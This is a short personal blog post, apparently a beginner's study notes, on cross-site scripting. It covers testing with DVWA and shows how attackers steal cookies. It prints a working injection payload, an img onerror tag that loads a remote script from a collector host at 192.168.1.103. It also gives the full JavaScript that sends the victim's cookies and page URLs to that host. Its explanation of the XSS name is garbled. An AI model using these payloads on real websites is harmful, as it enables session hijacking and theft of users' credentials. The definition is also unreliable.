---
layout: title
title: How to use XSS
date: 2018-12-17 09:11:06
tags: security
categories: Hack
---

After following the hack101 video tutorial for a while. I want to write some note about XSS. 

## What is XSS

XSS(Cross Site Scripting) is the mix abbreviation for Cascading Style Sheets, CSS. Though it seems out of date at the moment. But to some beginner just like me, it's a good way to experience the fun of looking bugs. 

## XSS detecting
People can deploy a DVWA as a dev environment for testing the XSS.

At the lowest security level of DVWA, the client owns no filter to any users input. It means, input is the output. 

The simplest XSS detecting is the `alert(1)`. Whether create a div or inject a `<script>alert(1)</script>`, the things we focus on is compile the code. 

## How hacker use XSS
Sometimes, when the security developer found that bug, he will terminate the XSS, that is one of his duty. But as a cursorily, he needs to use those bug to find why a way to hackin the inside. 
If the website exists XSS loophole, then it must be able to run the js code.

e.g. we can get the cookies on the page by enter alert(document.cookie). But most of time, hacker don't just inject a snippet of code, since it is no reason to use their own cookie. But they can send the cookies to a platform. Like XSSer, receive the XSS from all over the world. 

When xsser has done, hacker can insert the script into page like this: 

```
<img   onerror="s=createElement('script');body.appendChild(s);s.src='http://192.168.1.103/xss/SMA9ST';" src="x">
```

This is a img tag, the src is point to `x`. Obviously, this address is not exists. So it will run `onerror`. This function will generate a script tag, then point the new script tag to the xsser platform, which we builded before. Once the code request to the xsser. It will get the code, e.g.

```
(function() {
		(new Image()).src = 'http://192.168.1.103/xss/index.php?do=api&id=SMA9ST&location=' + escape((function() {
			try {
				return document.location.href
			} catch (e) {
				return ''
			}
		})()) + '&toplocation=' + escape((function() {
			try {
				return top.location.href
			} catch (e) {
				return ''
			}
		})()) + '&cookie=' + escape((function() {
			try {
				return document.cookie
			} catch (e) {
				return ''
			}
		})()) + '&opener=' + escape((function() {
			try {
				return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
			} catch (e) {
				return ''
			}
		})());
	})();
```

In this code snippet, it also generate a image object and request a xsser project. Than we got the location information and cookies. 

Everytime when people open XSS page, the browser will run that kind of code, it mask as a image to send data to xsser.

That is the simple usage of XSS.

